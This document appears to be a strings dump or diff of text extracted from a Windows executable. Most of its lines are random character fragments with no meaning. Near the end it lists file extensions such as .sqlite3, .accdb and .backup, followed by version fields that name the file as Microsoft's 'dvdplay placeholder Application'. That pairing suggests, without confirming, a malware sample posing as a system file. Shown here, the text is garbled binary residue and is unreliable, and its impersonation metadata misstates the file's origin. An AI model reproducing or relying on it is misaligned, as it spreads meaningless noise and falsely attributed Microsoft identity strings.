+i%1a")
+'1a")
+o_FR^r5&
+[,F$ )
+*(Nl@T~
+\/0s~TP
+@qt4mR
+2q'V>,
+dTb, 5
+^-[-A"x&
+w0^yWSo
+vN )G|
+OyQMQ[!
+]")ogg
+]!JAxv}
+%Rwa1qS
+PQB!>e
+[|ZyVN
+.[DZ"?
+bYSw'R
+e;'PWA
+*(Fo 5
+; *H2
+[(PSA]
+juC?MN
+<,$aKM_
+&bSo9y
+a *o8
+x#/\|9q
+K.7DT^rN
+P9'CD(
+eR7"65`
+,qyFtg
+&3O8 *
+<X!"^M5
+U0):/2Q
+un@"*_`{
+",??~v
+zOw_]Y$
+8!>vh"
+E")uM
+tS^,WZ_9E
+p=H vwa
+=rYJ4Y
+v2|VXc
+%"P*
+RMuZ-C
+q4n199
+tYC?d7
+t(ar8F
+y"*_`B
+mZ%"*O
+f55/m?z
+Z2DO;"
+,Ow1u^
+Dnj]g^-E
+[k\~$8`
+["jY0.
+*_TfXfS
+~FhU;k
+Gco/,Xj
+:F?/ 
+Z'q'Q*
+D-|V@T
+x9;0QW
+\E;Bx?*p
+wB<$bD
+iPpS2(lq9
+Hgn5%gn
+S[{o=D{LD
+loDY#}n
+MQ^r$b
+R~M~Xb
+/#*OF u
+\0VmjZ
+:nXF9@
+/#*Oa
+u-_Y$J
+6"vw\q
+C7w!>>
+{7yjlt
+#^G'j,
+%[Tz>!
+W~9UC_
+&bS33g
+Nyk08B
+w}DlGC
+>4nQ;h
+Dg0c;N
+4|WQ4|
+.9SGK{
+|en!K9`-
+.cux;i\
+n?7Z~o
+}4pN-E
+)"G0SX
+hLLJbG
+}g2y:b'
+3 *w.V
+TTOJ{G
+cd\2Gl
+)'zCK:p
+f@G:n1#
+:~(PA{
+uT|j3|
+rFh0G*j
+DR~_YM
+#7E@lG
+?WuWX'|
+v|}cj
+',RlEL
+Vy}8gh;
+7a Uw=
+2o51B8
+EcQ.sc{l
+bz"9jJH
+WA]MNwR
+e"[o|
+H:J\2Gl
+n>z;ZJ
+cH{=f1
+;[+G8[
+8ZJHf#G
+w+:n|8
++:Ruo>a;b
++.o;df4(G
+PcB5o=
+:sgx>GR
+^L>q&Y
+:vKW+G
+s1zn*W
+9RBa[p
+EL,WH="
+nCGT~`
+V{G,!G
+mMLCk"Vw
+; *opw
+3'd *'
+8eb:N9
+aH}u3h9
+tGLd@,
+(~SQC[
+y:l #G
+Q$D n"
+O,wK@G
+H:Zq2C48
+RQ nP;
+GnP&&{
++NsvS&
+qm<;k5
+RB/GK W
+#G<ax
+z *?3]{
+a@s{/;2Cjy
+O/ni@T~Fyd
+?abnbZM:
+n\GQT~
+50\ILl
+<f8ZJH
+mkF`[GR
+xz~[D
+@CK:V1i
+*"a~"\*U
++ML*-G
+lG>Z<3
+G"<"+?
+Kr")/e
+vTxsdQ
+[F#5CD
+vH8F#b
+Z5xHkB
+wd@.j\e
+v8[[yOg
+P{B^i0
+ar32PY
+*#f=$
+Ej&x(X
+^[Dn n
+9FNdcl
+%n'9}f
+d\%w2B*
+d{a!Ru
+$ DFg04It
+n9P5cL
+b@H"c@
+TKToRKl
+Aff9!+
+T]Z'x0
+8jesJg
+"3FFJ'*
+Q<!OD6
+}JxsgrK<;^1p
+Gc*\I4
+w6L,{\
+`nrK87y
+qh *R>vR4 
+}JxCdl
+[5"+GJ
+h{u.yk
+Qv &"}
+OE@j`|
+]wdF*j
+A".BcO
+pk6BQE
+L8a~U_M:a
+JyC:Q+o
+='K")gj
+o,DRNw.
+0brK<g/2
+!*/wI
+Df,8NI9
+\7lI.T
+%@R>pO
+YNSy U7,
+BT~]3CV
+YbgX%R;.
+bN=+wN
+pu&rQx
+|lE!)
+eh~K84
+7,B,j\pv
+NlXT+ 
+$uB(*B
+0[pQSf
+@\5~QD,
+E8~( .
+|cqQzc
+Ea0H9P'
+35~s!J\
+\^iTh4
+tkY+D6
+M0*MUTT
+[BwKAb
+DE]2K+
+n6b3*b
+by38C~B
+&QQQ]IT
+K,fD Y
+h+g8")
+dL2)qs
+r'N/^A
+bTeJ$
+r)14_!
+~j4bu
+U4v{u8
+{a!R_=;
+NK'!I 
+dD(Gm9
+G2 nk#
+oI,-^A
+q;Zh"5
+dL/^B]
+$xbQu/
+F`^ub 
+:qOK@ly
+U_84|f;
+Hi`7(!
+DT#<(H
+;v2Bb`
+QGGbd>
+?}~%bQ
+.!RQt&
+>O)'k"
+X\"RBh
+j2d@cd
+d,xTYb
+JF+Y] VwO
+WD,jW0
++Q!c a
+ku~8DQ
+mK49g]
+_FR.;
+DhyX0v
+W"ID(y
+j1SldB
+bQS1kX
+"@K:j9
+w.|jDl`8
+P]!K 
+%:#.Fj
+_Y] 4p
+>1u4w{a
+cSIbL/E
+^K(b/H
+V~{%Ru
+D\YXbUMdA
+U2&b`s
+/j(}%H
+Zzul*#
+3.Et0J
+JO[qDy
+uY#T?<H
+@(jOCW
+U >"E<
+U1Q}'c<$t
+AVG[0R
+*lR!!T
+}/OE@\k[
+0V}Hd;
+ST=E!'
+2'K!)3C
+bAcZ;H
+A"F|J0F<H
+rFFh#(o{+9
+Y] (_W
+p@SE1@
+D,JQU$
+(nq\+oq
+;d uID
+sD&BugDIu$6!
+DP~E`v
+}e6Z#*g
+NRM#J4
+E'~I,;
+rGF26^
+cB&JFL
+$wSQ@T
+.!BQ{%
+fsBX#(
+R_9& H
+$fqN$#I
+IHcw0dJt
+@gN!+
+@DR+UO)
+bBXK(!
+Okxg)T
+:""K[)
+TQWQ:j#H
+z3R:^F
+?~{%RQ
+W"K X 
+m3gQ!U
+?-Q%c"
+ bQ1/]
+RBWz 3
+:|h(zWK
+F:Bf`s
+H$Ruy[
+<xa]vL
+)F?}ET
+g.,Dh`
+8M`s'4
+dF\=V7B
+Z}%T><
+B@)"|Q+Lcs
+uF6Z!(
+f"U7lZOQa
+~+"bQ{j~
+ATXT}g
+j2Z{Ht
+%qE`oD
+01wQS&
+1rQk<k
+gY!)g"<K
+rl9wQ-[^3
+zvzH:NY
+[MFp08/
+Y.HD$u
+dJOw"Sz
+HzkTK
+8SkaY9SG
+X#Vw18
+^.*P}'
+eQ3'2"
+/qB(*\1
+%z>#y]
+I%y]r
+KWH@lG
+$"9`gQ
+v&5JF<
+1{~s_y
+Be3Vvb
+%1ubA&
+*|jDXX
+P@hydt
+bQ1ew=
+E!IDjY
+jEBqlk
+.Xl-Q.
+<$"ceQCn
+windows 2000 2195
+windows 2000 5.0
+.sqlite3
+.sqlitedb
+.accdb
+.class
+.backup
+.onetoc2
+VS_VERSION_INFO
+StringFileInfo
+040904B0
+CompanyName
+Microsoft Corporation
+FileDescription
+dvdplay placeholder Application
+FileVersion
+6.1.7600.16385 (win7_rtm.090713-1255)
+InternalName
+dvdplay
+LegalCopyright
+ Microsoft Corporation. All rights reserved.
+OriginalFilename
+dvdplay
+ProductName
+Microsoft
+ Windows
+ Operating System
+ProductVersion
+6.1.7600.16385
+VarFileInfo
+Translation
